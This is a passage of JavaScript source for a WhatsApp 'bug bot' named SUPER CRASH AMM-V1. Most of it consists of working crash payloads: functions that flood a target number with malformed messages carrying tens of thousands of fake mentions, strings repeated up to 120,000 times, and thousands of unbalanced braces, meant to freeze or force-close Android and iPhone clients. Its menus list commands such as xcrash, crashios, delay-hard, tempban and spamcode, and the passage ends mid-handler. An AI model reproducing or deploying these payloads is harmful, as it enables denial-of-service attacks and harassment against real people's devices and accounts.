      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Tama Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function PrivateBlank(target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Sadistic Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, message, { participant: { jid: target } });
}
//fc
async function GraciForce(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "the king",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "gracia",
                address: "the king gracia",
              },
            },
            body: {
              text: "graciaa",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target},
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

//SEND CALL
async function sendOfferCall(target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(target) {
    try {
        await sock.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
sock.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await sock.sendPresenceUpdate('composing', jid)
      return sock.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const xreplyWithButton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'SUPER CRASH AMM-V1',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363421992534354@newsletter@newsletter",
        serverMessageId: null,
        newsletterName: `TESTI AMM STORE`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const xreplybugbutton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomBugs },
    caption: teks,
    footer: 'SUPER CRASH AMM-V1',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363421992534354@newsletter@newsletter",
        serverMessageId: null,
        newsletterName: `TESTI AMM STORE`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const kontolreply = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐓𝐡𝐞 𝐄𝐱𝐭𝐨𝐫𝐝𝐢𝐭𝐜𝐯`,
                body: `©`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomMenu,
                sourceUrl: `https://whatsapp.com/channel/0029Vb6jcCVGpLHMQZhOBF0h`
            }
        }
    }, { quoted: lol });
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `SUPER CRASH AMM-V1🌹\n𝐂𝐨𝐦𝐦𝐚𝐝 : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
		
const ThumbUrl = "https://j.top4top.io/p_3319xbxss1.jpeg"
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐓𝐡𝐞 𝐀𝐩𝐨𝐜𝐚𝐥𝐲𝐩𝐬𝐞 🕊️`,
                    body: `©`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@RizxzWangsaff1205`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        xreplyWithButton('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

let limitUser = PremOnly ? 1 : global.limitCount
async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
//fcinvis
async function RyuciDelay(target, mention = true) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "⛧ Amm ⛧" + "ោ៝".repeat(10000),
    title: "⛧ Amm ⛧",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.youtube.com/@Kamilxiter",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "⛧ Amm ⛧",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421992534354@newsletter@newsletter",
      serverMessageId: 1,
      newsletterName: "⛧ Amm ⛧",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function RedWariorLoca(sock, jid) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/21416858_2558442404498210_7729407464837294349_n.enc",
            mimetype: "video/mp4",
            fileName: "redwarrior.mp4",
            fileLength: "999999999",
            seconds: 99999,
            caption: "Red Warior Crash By Telegram: t.me/sonicwarior"
          },
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 35.3606,
                degreesLongitude: 138.7274,
                name: "Red Warior",
                address: "Red Warior"
              }
            },
            body: {
              text: "🔴 System Bug By: t.me/AmmNotDev"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Red Warior",
                    id: "rw_crash"
                  })
                }
              ],
              messageParamsJson: JSON.stringify({
                text: "Red Warior",
                footer: "Version 1"
              })
            }
          },
          contextInfo: {
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  conversation: "Payload Confirmed",
                  contextInfo: {
                    quotedMessage: {
                      viewOnceMessage: {
                        message: {
                          conversation: "Red Warior..."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(jid, payload, { quoted: null });
    await sock.relayMessage(jid, msg.message, { messageId: generateMessageID() });
  } catch {}
}
  
async function VampireBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Amm NI BOSS 🥶" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}

async function freezeIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "i p h o n e - f r e e z e" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function ForceCall(target) {
let InJectXploit = JSON.stringify({
status: true,
criador: "TheXtordcv",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "⩟⬦𪲁 SUPER CRASH AMM-V1",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: InJectXploit,
},
{
name: "call_permission_request",
buttonParamsJson: InJectXploit + "{",
},
],
},
},
},
},
}, {}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}
//==============END================
//=================================================//

const RunTime = `_${runtime(process.uptime())}_`
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
case 'menu':
case 'V.1': {
  let limitnya = useLimit;
  let Menu = `*— ( 🕊️ ) ⾷ Hayy.. ${info}*
\`\`\`SUPER CRASH AMM-V1 GUNAKANLAH BUG INI DENGAN BIJAK, KARENA BUG INI TERLALU KEJAM DAN MEMATIKAN\`\`\`

\`-# Information  Script\`
\`•\` *Script :* SUPER CRASH AMM-V1
\`•\` *Verison :* 1.0
\`•\` *Versi SC :* VVIP SUPER CRASH AMM
\`•\` *Telegram :* https://t.me/AmmNotDev
\`•\` *Mode :* ${sock.public ? "Public" : "Self"}
\`•\` *Status :* ${DevOnly ? "Owner " : PremOnly ? "Premium" : "User"}
\` Runtime : ${runtime(process.uptime())}\``;
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'SUPER CRASH AMM-V1',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421992534354@newsletter@newsletter",
      serverMessageId: null,
      newsletterName: `TESTI AMM STORE`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "⌁⃰𝐁𝐔𝐆 𝐌𝐄𝐍𝐔༑",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "⌁⃰₮Q₮Ø༑",
              description: "",
              id: `.tqto`
            },
            {
              header: "",
              title: "⌁⃰𝐀𝐋𝐋 𝐌𝐄𝐍𝐔༑",
              description: "",
              id: `.allmenu`
            }
          ]
        },
        {
          title: "⌜ 𝐗𝐕𝐕𝐈𝐏 -𝗞𝗜𝗥 ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "⌁⃰𝐗𝐗𝐗-₭ŁŁⱤ༑",
              description: "",
              id: `.owner`
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);
return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break
case 'bugmenu': {
let limitnya = useLimit
let Menu = `*— ( 🕊️ ) ⾷ Hayy.. ${info}*
\`\`\`SUPER CRASH AMM-V1 GUNAKANLAH BUG INI DENGAN BIJAK, KARENA BUG INI TERLALU KEJAM DAN MEMATIKAN\`\`\`

\`クラッシャーフォーエックス\`
*Press The Menu Button Below 🩸*`
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'SUPER CRASH AMM-V1',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421992534354@newsletter@newsletter",
      serverMessageId: null,
      newsletterName: `TESTI AMM STORE`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐓𝐘𝐏𝐄",
      sections: [
        {
          title: "⌜ 𝐆𝐑𝐎𝐔𝐏 - 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⌟",
          highlight_label: "🎭",
          rows: [
            {
              header: "",
              title: "⌜ 𝕭𝖀𝕲 - 𝕸𝕰𝕹𝖀 ⌟️",
              description: "menampilkan menu bug grup",
              id: `.allbugmenu`
            },
            {
              header: "",
              title: "⌜ ＢＵＧ - ＣＨＡＮＮＥＬ ⌟️",
              description: "menampilkan menu bug channel",
              id: `.bugchmenu`
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
}; 

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break
case 'allbugmenu': {
let Menu = `*— ( 🕊️ ) ⾷ Hayy.. ${info}*
\`\`\`SUPER CRASH AMM-V1 GUNAKANLAH BUG INI DENGAN BIJAK, KARENA BUG INI TERLALU KEJAM DAN MEMATIKAN\`\`\`

╔─═「 \`𝙸𝚅𝙸𝚂𝙸𝙱𝙻𝙴\` 」
│┏─⊱
║▢ xperma *‹62xxx›*
║▢ xcrash *‹62xxx›*
║▢ delay-hard *‹62xxx›*
║▢ delayinvis *‹62xxx›*
║▢ delaymsg *‹62xxx›*
║▢ xdelay *‹62xxx›*
│┗─⊱
╚─═─═─═─═─═─═⪩

╔─═「 \`𝚂𝚄𝙿𝙴𝚁𝙱𝚄𝙶\` 」
│┏─⊱
║▢ kir-fc *‹62xxx›*
║▢ kir-ip *‹62xxx›*
║▢ kir-blank *‹62xxx›*
│┗─⊱
╚─═─═─═─═─═─═⪩

╔─═「 \`𝙸𝙾𝚂\` 」
│┏─⊱
║▢ xios *‹62xxx›*
║▢ trashios *‹62xxx›*
║▢ crashios *‹62xxx›*
│┗─⊱
╚─═─═─═─═─═─═⪩`
xreplyWithButton(Menu)
}
break

case 'allmenu': {
let limitnya = useLimit
let Menu = `*— ( 🕊️ ) ⾷ Hayy.. ${info}*
\`\`\`SUPER CRASH AMM-V1 GUNAKANLAH BUG INI DENGAN BIJAK, KARENA BUG INI TERLALU KEJAM DAN MEMATIKAN\`\`\`

\`—( Ｉｎｆｏｒｍａｔｉｏｎ )\`
\`⺙\` *Script :* SUPER CRASH AMM-V1
\`⺓\` *Verison :* 1.0
\`グ\` *Mode :* ${sock.public ? "Public 開" : "Self 用"}
\`ボ\` *Status :* ${DevOnly ? "Owner 公" : PremOnly ? "Premium プム" : "User"}
\`見 Runtime : ${runtime(process.uptime())}\`

╔─═「 \`𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄\` 」
│┏─⊱
║▢ self *‹62xxx›*
║▢ public *‹62xxx›*
║▢ adddatabase *‹62xxx›*
║▢ deletebase *‹62xxx›*
║▢ addowner *‹62xxx›*
║▢ delowner *‹62xxx›*
║▢ setpp *‹62xxx›*
║▢ delpp *‹62xxx›*
│┗─⊱
╚─═─═─═─═─═─═⪩
╔─═「 \`𝙶𝚁𝙾𝚄𝙿 𝙼𝙴𝙽𝚄\` 」
│┏─⊱
║▢ kick *‹62xxx›*
║▢ hidetag *‹TagMember›*
║▢ linkgroup *‹InGroup›*
║▢ resetlinkgc *‹InGroup›*
║▢ join *‹LinkGroup›*
│┗─⊱
╚─═─═─═─═─═─═⪩
╔─═「 \`𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄\` 」
│┏─⊱
║▢ spamcode *‹62xxx›*
║▢ tempban *‹62xxx›*
║▢ reactch *‹LinChannel›*
║▢ tourl *‹Reply/Image›*
║▢ brat *‹Text›*
│┗─⊱
╚─═─═─═─═─═─═⪩
╔─═「 \`𝙵𝚄𝙽 𝙼𝙴𝙽𝚄\` 」
│┏─⊱
║▢ tiktok *‹Reply/Link›*
║▢ play *‹SearchMusic›*
║▢ tovn *‹Reply/Image›*
║▢ sticker *‹Reply/Image›*
║▢ qc *‹Text›*
│┗─⊱
╚─═─═─═─═─═─═⪩`
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'SUPER CRASH AMM-V1',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421992534354@newsletter@newsletter",
      serverMessageId: null,
      newsletterName: `TESTI AMM STORE`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "⌁⃰𝐁𝐔𝐆 𝐌𝐄𝐍𝐔༑",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "⌁⃰𝐀𝐋𝐋 𝐌𝐄𝐍𝐔༑",
              description: "",
              id: `.allmenu`
            }
          ]
        },
        {
          title: "⌜ 𝐗𝐕𝐕𝐈𝐏 - 𝐙𝐀𝐏 ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "⌁⃰𝐗𝐗𝐗-𝐙𝐀𝐏༑",
              description: "",
              id: `.owner`
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
		break

case 'tqto': {
  let limitnya = useLimit;
  let Menu = `
  ╭─▧ 𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝘾𝙤𝙧𝙚 𝙏𝙚𝙖𝙢 💫
│🕋 Allah        My God
│👨‍👩‍👧 Ortu         Big Support
│👨‍💻 Amm         Developer
│🤝 Semua      Support
╰────────────────

> © Amm - 𝟸𝟶𝟸𝟻`
xreplyWithButton(Menu)
}

break
case 'stuckgb': {
  if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
  if (!q) return kontolreply(example("https://chat.whatsapp.com/"));

  try {
    await sleep(1000);
    xreplybugbutton(`Bot successfully sends a virus message`);

    let result = args[0].split("https://chat.whatsapp.com/")[1];
